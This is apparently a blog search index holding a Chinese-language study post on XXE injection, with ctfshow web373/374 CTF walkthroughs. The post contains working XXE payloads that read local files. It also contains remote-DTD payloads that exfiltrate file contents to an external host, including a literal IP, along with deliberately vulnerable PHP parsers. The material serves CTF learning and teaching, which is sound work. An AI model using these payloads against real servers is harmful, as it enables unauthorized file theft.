<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>xxe漏洞学习</title>
    <link href="/2024/06/10/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/06/10/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>前言:深入浅出的学习一下xxe漏洞</p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/3357?time__1311=n4+xnD0DgGYQwqYq40HpDUoL7rAT2rD&alichlgref=https://www.google.com/">一篇文章带你深入理解漏洞之 XXE 漏洞</a></p><p><a href="https://blog.csdn.net/qq_61553520/article/details/130565993">XXE漏洞详解(全网最详细)</a></p><p><a href="https://blog.csdn.net/jayq1/article/details/139299924">【CTF-Web】XXE学习笔记</a></p><h2 id="一、XXE-是什么"><a href="#一、XXE-是什么" class="headerlink" title="一、XXE 是什么"></a><strong>一、XXE 是什么</strong></h2><p>在了解xxe之前，需要了解一下xml注入，通常都是逻辑漏洞，如下内容</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/xml.png" alt="xml"></p><p>能插入xml代码，肯定还想要更多骚操作，于是就出现了xxe</p><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，是一个注入漏洞。注意的是<strong>外部实体</strong>，不要被其他名字相似的东西扰乱了思维。</p><h2 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a>二、基础知识</h2><h3 id="XXE漏洞原理"><a href="#XXE漏洞原理" class="headerlink" title="XXE漏洞原理"></a>XXE漏洞原理</h3><p>漏洞成因：解析时未对XML外部实体加以限制，导致攻击者将恶意代码注入到XML中，导致服务器加载恶意的外部实体引发文件读取，SSRF，命令执行等危害操作。</p><p>特征：HTTP的Request报文出现以下请求报文，说明采用的是xml数据传输，可以进行xml测试漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Content-<span class="hljs-built_in">type</span>:text/xml application/xml<br></code></pre></td></tr></table></figure><h3 id="XML的基础知识"><a href="#XML的基础知识" class="headerlink" title="XML的基础知识"></a>XML的基础知识</h3><h4 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">XML 指可扩展标记语言（EXtensible Markup Language）<br>XML 是一种标记语言，很类似 HTML<br>XML 被设计为传输和存储数据，其焦点是数据的内容<br>XML 被设计用来结构化、存储以及传输信息<br>XML 允许创作者定义自己的标签和自己的文档结构<br></code></pre></td></tr></table></figure><h4 id="结构"><a href="#结构" class="headerlink" title="结构:"></a>结构:</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1.XML 文档声明，在文档的第一行<br>2.XML 文档类型定义，即DTD，XXE 漏洞所在的地方<br>3.XML 文档元素<br></code></pre></td></tr></table></figure><h4 id="格式规范DTD"><a href="#格式规范DTD" class="headerlink" title="格式规范DTD:"></a>格式规范DTD:</h4><p>XML 文档有自己的格式规范，这个格式规范是 DTD（document type definition） 来控制的，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义<br>&lt;!DOCTYPE message [<br>&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;<br>&lt;!ELEMENT receiver (#PCDATA)&gt;<br>&lt;!ELEMENT sender (#PCDATA)&gt;<br>&lt;!ELEMENT header (#PCDATA)&gt;<br>&lt;!ELEMENT msg (#PCDATA)&gt;<br></code></pre></td></tr></table></figure><p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">message</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">receiver</span>&gt;</span></span>Myself<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">sender</span>&gt;</span></span>Someone<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">sender</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span></span>TheReminder<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">msg</span>&gt;</span></span>This is an amazing book<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">msg</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>除了定义元素，还可以定义实体，分为内部实体和外部实体</p><h5 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;<br></code></pre></td></tr></table></figure><p>这里定义元素是ANY，说明接受任何元素，但是又定义了一个实体(也可以把他看成一个变量)，那么就可以写作这样</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们使用了&amp;xxe对上面定义的xxe实体进行了引用，到时候输出的时候&amp;xxe就会被test替代。</p><h5 id="外部实体-重点"><a href="#外部实体-重点" class="headerlink" title="外部实体(重点)"></a>外部实体(重点)</h5><p>有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，<br>外部实体的引用可以利用如下协议<br>file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.ext<br><a href="http://url/file.ext">http://url/file.ext</a><br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;conf.php</p><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;<br>&lt;creds&gt;<br>    &lt;user&gt;&amp;xxe;&lt;/user&gt;<br>    &lt;pass&gt;mypass&lt;/pass&gt;<br>&lt;/creds&gt;<br></code></pre></td></tr></table></figure><p>这样对引用资源所做的任何更改都会在文档中自动更新</p><p>还有一种引用方式是使用 引用公用 DTD的方法,如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt;<br>%xxe;<br>]&gt;<br>&lt;foo&gt;&amp;evil;&lt;/foo&gt;<br> <br>外部evil.dtd中的内容<br>&lt;!ENTITY evil SYSTEM “file:///d:/1.txt” &gt;<br></code></pre></td></tr></table></figure><p>%xxe执行后会加载外部实体 evil.dtd 并执行，得到的结果会放在&lt;foo&gt;&lt;&#x2F;foo&gt;中。</p><hr><p>我们在上面将实体分为了内部和外部，但是实际情况上，也可以分为通用实体和参数实体（orz</p><h5 id="通用实体"><a href="#通用实体" class="headerlink" title="通用实体"></a>通用实体</h5><p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用，例如</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">updateProfile</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span></span><br><span class="hljs-meta"> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">updateProfile</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">firstname</span>&gt;</span>Joe<span class="hljs-tag">&lt;/<span class="hljs-name">firstname</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">lastname</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">lastname</span>&gt;</span>  <br>    ... <br><span class="hljs-tag">&lt;/<span class="hljs-name">updateProfile</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h5><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">an-element</span> <span class="hljs-string">&quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;</span>&gt;</span> <br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote-dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://somewhere.example.org/remote.dtd&quot;</span>&gt;</span> <br>%an-element; %remote-dtd;<br></code></pre></td></tr></table></figure><p>参数实体在我们 Blind XXE 中起到了至关重要的作用</p><h2 id="三、XXE漏洞利用"><a href="#三、XXE漏洞利用" class="headerlink" title="三、XXE漏洞利用"></a>三、XXE漏洞利用</h2><p>通过对基础知识的理解，我们不难发现可以通过读dtd,将路径换成敏感路径，把敏感路径读取出来</p><h3 id="有回显读取本地文件"><a href="#有回显读取本地文件" class="headerlink" title="有回显读取本地文件"></a>有回显读取本地文件</h3><p>由于本人php版本高于7.1需要将代码进行适当的调整，如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 输出所有错误信息</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">1</span>);<br><br><span class="hljs-comment">// 临时允许外部实体加载（仅用于测试）</span><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">// 获取XML字符串</span><br><span class="hljs-variable">$xmlString</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;xml&#x27;</span>];<br><br><span class="hljs-comment">// 解析XML字符串</span><br><span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">simplexml_load_string</span>(<span class="hljs-variable">$xmlString</span>, <span class="hljs-literal">null</span>, LIBXML_NOENT);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$xml</span> === <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Failed to load XML. Errors: &quot;</span>;<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-title function_ invoke__">libxml_get_errors</span>() <span class="hljs-keyword">as</span> <span class="hljs-variable">$error</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>, <span class="hljs-variable">$error</span>-&gt;message;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Parsed XML: &quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$xml</span>); <span class="hljs-comment">// 使用htmlspecialchars防止XSS</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>payload进行url编码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///D://1.txt&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/%E6%9C%AC%E5%9C%B0%E5%9B%9E%E6%98%BE.png" alt="本地回显"></p><p>由此还可以继续延申，在这种情况下由于没有什么特殊符号，可以顺利读取，那假如有呢</p><p>比如<img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/1.txt.png" alt="1.txt"></p><p>我们再继续尝试看看网页，此时会有一堆报错</p><p>这个时候可以使用<strong>CDATA</strong></p><p>介绍：CDATA节中所有的字符都会被当做元素字符数据的常量部分，而不是xml标记</p><p>因此可以尝试把读出来的数据放在CDATA中输出进行绕过,这里会用到参数实体，payload就不展示了，感兴趣可以自己尝试。</p><h3 id="无回显读取本地文件"><a href="#无回显读取本地文件" class="headerlink" title="无回显读取本地文件"></a>无回显读取本地文件</h3><h4 id="加载远程DTD"><a href="#加载远程DTD" class="headerlink" title="加载远程DTD"></a>加载远程DTD</h4><p>在远程服务器上新建test.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx.xxx.xxx.xxx/?content=%file;&#x27;&gt;&quot;&gt; %payload;<br>//%号要进行实体编码成&amp;#x25<br></code></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;!DOCTYPE test[<br>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/1.txt&quot;&gt;<br>&lt;!ENTITY % dtd SYSTEM &quot;http://xxx.xxx.xxx.xxx/test.dtd&quot;&gt;<br>%dtd;<br>%send;<br>]&gt;<br></code></pre></td></tr></table></figure><p>讲一下流程：首先先执行%dtd请求远程服务器上的test.dtd,然后执行%payload发送执行%file，最后执行%file获取对方服务器上的敏感文件，替换%send，实现外带</p><p>套用模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; <br>&lt;!DOCTYPE data [<br>&lt;!ENTITY % file SYSTEM &quot;file:///c://test/1.txt&quot;&gt;<br>&lt;!ENTITY % dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt; <br>%dtd; %all; <br>]&gt; <br>&lt;value&gt;&amp;send;&lt;/value&gt;<br> <br>evil.xml文件内容为<br>&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://localhost:88%file;&#x27;&gt;&quot;&gt;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE root [<br>&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=c:/test/1.txt&quot;&gt;<br>&lt;!ENTITY % dtd SYSTEM &quot;http://localhost:88/evil.xml&quot;&gt;<br>%dtd;<br>%send;<br>]&gt;<br>&lt;root&gt;&lt;/root&gt;<br> <br>evil.xml文件内容为：<br>&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://localhost:88/?content=%file;&#x27;&gt;&quot;&gt; %payload;<br></code></pre></td></tr></table></figure><h4 id="加载本地DTD"><a href="#加载本地DTD" class="headerlink" title="加载本地DTD"></a>加载本地DTD</h4><p>这种在刷题的时候不太常见，可以参考上面的参考文章使用。</p><h2 id="四、靶机演练"><a href="#四、靶机演练" class="headerlink" title="四、靶机演练"></a>四、靶机演练</h2><h3 id="1-ctfshow-web373"><a href="#1-ctfshow-web373" class="headerlink" title="1.ctfshow web373"></a>1.ctfshow web373</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$ctfshow</span> = <span class="hljs-variable">$creds</span>-&gt;ctfshow;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$ctfshow</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br><br></code></pre></td></tr></table></figure><p>代码大题的意思是读取xml，然后在xml文件中提取ctfshow标签中的内容，随后进行echo</p><p>直接尝试构造就行，有回显的还是挺简单的。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ctfshow</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">ctfshow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/web373.png" alt="web373"></p><h3 id="2-ctfshow-web374"><a href="#2-ctfshow-web374" class="headerlink" title="2.ctfshow web374"></a>2.ctfshow web374</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xmlfile</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);    <br><br></code></pre></td></tr></table></figure><p>和第一个比较起来，第二个无回显。这个时候需要vps将内容带出来。</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hacker</span>[</span></span><br><span class="hljs-meta"><span class="language-xml">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span> </span></span><br><span class="hljs-meta"><span class="language-xml">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtds</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://vps:8888/test.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">    %dtds;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span>    </span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">1</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p>然后在服务器上传test.dtd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; showflag SYSTEM &#x27;http://8.130.42.113:5566/%file;&#x27;&gt;&quot;&gt;<br>&lt;!--test.dtd的内容，内部的%号要进行实体编码成&amp;#x25;  相当于% showflag--&gt;<br>%dtd;<br>%showflag;<br><br></code></pre></td></tr></table></figure><p>先用python开端口监听</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-1.png" alt="374-1"></p><p>然后再开端口接收内容</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-2.png" alt="374-2"></p><p>最后base解密就可以了</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0/374-3.png" alt="374-3"></p><p>流程:首先在burpsuite的repeated页面构造最上面的payload，利用参数实体，调用%dtds,获得服务器上的test.dtd,再到dtd中的%dtd中的%showflag,这里注意%需要进行实体编码&amp;#x25，把内容带出到我们开的端口上面，最后得到flag。</p><p>ps:我本地没有配置web服务，所以需要开个http服务，如果有配置的话不需要一些步骤，可以参考其他师傅的wp了解一下。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xxe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Polarctf2024夏</title>
    <link href="/2024/06/09/polarctf/PolarCTF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A82024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2024/06/09/polarctf/PolarCTF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A82024%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
